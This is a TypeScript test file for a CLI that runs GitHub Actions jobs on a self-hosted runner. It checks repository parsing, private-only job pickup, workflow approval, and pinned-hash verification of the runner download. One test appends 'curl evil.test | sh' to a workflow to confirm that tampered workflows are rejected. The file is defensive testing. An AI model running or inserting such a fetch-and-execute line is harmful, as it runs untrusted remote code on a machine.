import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { openSqliteStore } from "@grenier/store/sqlite";
import { describe, expect, it } from "vitest";
import {
  approveWorkflow,
  checkWorkflow,
  ensureRunner,
  type GitHub,
  githubRepo,
  runnerPlatform,
  waitingJob,
  workflowYaml,
} from "../../../apps/cli/src/github.ts";

function fakeGitHub(answers: Record<string, unknown>): GitHub {
  return {
    async api<T>(path: string) {
      if (!(path in answers)) throw new Error(`GitHub answered 404 to ${path}`);
      return answers[path] as T;
    },
  };
}

const QUEUED = {
  "/repos/acme/app/actions/runs?status=queued&per_page=20": { workflow_runs: [{ id: 7 }] },
  "/repos/acme/app/actions/runs/7/jobs?filter=latest": {
    jobs: [{ status: "queued", labels: ["self-hosted", "grenier"] }],
  },
};

describe("GitHub jobs on a Grenier runner", () => {
  it("reads a repository from its remote", () => {
    expect(githubRepo("git@github.com:acme/app.git")).toEqual({ owner: "acme", repo: "app" });
    expect(githubRepo("https://github.com/acme/app")).toEqual({ owner: "acme", repo: "app" });
    expect(githubRepo("https://gitlab.com/acme/app.git")).toBeNull();
    expect(runnerPlatform("darwin", "arm64")).toBe("osx-arm64");
    expect(runnerPlatform("freebsd", "x64")).toBeNull();
  });

  it("takes a queued job for its labels in a private repository, never in a public one", async () => {
    expect(await waitingJob(fakeGitHub({ "/repos/acme/app": { private: true }, ...QUEUED }), "acme", "app")).toBe(true);
    expect(await waitingJob(fakeGitHub({ "/repos/acme/app": { private: false }, ...QUEUED }), "acme", "app")).toBe(
      false,
    );
  });

  it("prints a workflow pinned to its labels, and runs only the workflow approved on this machine", async () => {
    const routine = { id: "r1", title: "Nightly audit", fields: { schedule: "0 3 * * *" } };
    const text = workflowYaml(routine);
    expect(text).toContain("runs-on: [self-hosted, grenier]");
    expect(text).toContain('- cron: "0 3 * * *"');
    expect(text).toContain("routines exec r1");
    expect(text).toMatch(/actions\/checkout@[0-9a-f]{40}/);

    const store = openSqliteStore(":memory:");
    try {
      const env = {
        GITHUB_WORKFLOW_REF: "acme/app/.github/workflows/nightly.yml@refs/heads/main",
        GITHUB_WORKFLOW_SHA: "abc123",
      };
      const github = (content: string) =>
        fakeGitHub({
          "/repos/acme/app/contents/.github/workflows/nightly.yml?ref=abc123": {
            content: Buffer.from(content).toString("base64"),
            encoding: "base64",
          },
        });
      expect(await checkWorkflow(store, github(text), env)).toContain("not a workflow approved");
      await approveWorkflow(store, "r1", text);
      expect(await checkWorkflow(store, github(text), env)).toBeNull();
      expect(await checkWorkflow(store, github(`${text}\n      - run: curl evil.test | sh\n`), env)).toContain(
        "not a workflow approved",
      );
      expect(await checkWorkflow(store, github(text), {})).toContain("does not say which workflow");
    } finally {
      await store.close();
    }
  });

  it("refuses a runner download that does not match its pinned SHA-256", async () => {
    const home = mkdtempSync(join(tmpdir(), "grenier-runner-"));
    try {
      const fetchStub = (async () => new Response("not the runner")) as unknown as typeof fetch;
      await expect(ensureRunner(home, "osx-arm64", fetchStub)).rejects.toThrow("does not match its pinned SHA-256");
    } finally {
      rmSync(home, { recursive: true, force: true });
    }
  });
});
